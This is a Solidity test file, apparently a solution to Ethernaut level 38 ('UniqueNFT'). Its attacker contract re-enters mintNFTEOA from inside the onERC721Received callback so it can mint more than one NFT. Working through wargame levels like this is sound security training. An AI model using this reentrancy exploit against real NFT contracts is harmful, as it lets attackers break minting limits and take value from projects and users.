// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {UniqueNFT} from "../../src/ethernaut/38_UniqueNFT/UniqueNFT.sol";

contract UniqueNFT_Attacker {
	address player;
	UniqueNFT uniqueNFT;
	bool isERC721Received = false;
	
	constructor(UniqueNFT uniqueNFT_) payable {
		player = msg.sender;
		uniqueNFT = uniqueNFT_;
	}
	
	receive() external payable {}
	
	function doAttack(UniqueNFT uniqueNFT_) public {
		uniqueNFT = uniqueNFT_; // 之前的 uniqueNFT 已经失效，重新填充 uniqueNFT !!!
		uniqueNFT.mintNFTEOA();
	}
	
	function onERC721Received(
		address operator,
		address from,
		uint256 tokenId,
		bytes calldata data
	) external returns (bytes4) {
		if (!isERC721Received) {
			isERC721Received = true;
			uniqueNFT.mintNFTEOA();
		}
		return this.onERC721Received.selector;
	}
}
